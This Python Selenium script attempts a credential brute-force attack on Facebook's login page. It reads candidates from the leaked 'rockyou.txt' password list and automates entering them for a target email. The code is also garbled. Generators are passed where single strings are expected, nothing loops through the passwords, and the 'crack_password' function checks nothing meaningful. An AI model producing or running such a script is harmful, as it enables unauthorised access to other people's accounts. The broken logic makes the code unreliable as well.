from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import os
import re

def get_passwords(filename):
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                yield line.strip()
    except FileNotFoundError:
        print("Password file not found.")
        return



def crack_password(password):
    common_characters = '!@#$%^&*()-=+[]{}|\\'
    valid_chars = set(common_characters.lower().split())
    return any(char in password for char in valid_chars)


def test(username, password, url):
    try:
        # Create the driver instance
        browser = webdriver.Chrome()
        browser.get(url)

        # Find and fill the email input field
        email_field = WebDriverWait(browser, 10).until(
            EC.presence_of_element_located((By.ID, 'email'))
        )
        email_field.send_keys(username)

        # Find and fill the password input field
        password_field = WebDriverWait(browser, 10).until(
            EC.presence_of_element_located((By.ID, 'pass'))
        )
        password_field.send_keys(password)

        # Find and click the login button
        login_button = WebDriverWait(browser, 10).until(
            EC.element_to_be_clickable((By.NAME, 'login'))
        )
        login_button.click()

    except Exception as e:
        print("Error:", str(e))


def main():
    password = get_passwords('rockyou.txt')
    if crack_password(password):
        print("Password valid.")
    else:
        print("Password invalid or not in common characters.")

    test(username='user@gmail.com', password=get_passwords('rockyou.txt'), url='https://www.facebook.com')


if __name__ == "__main__":
    main()
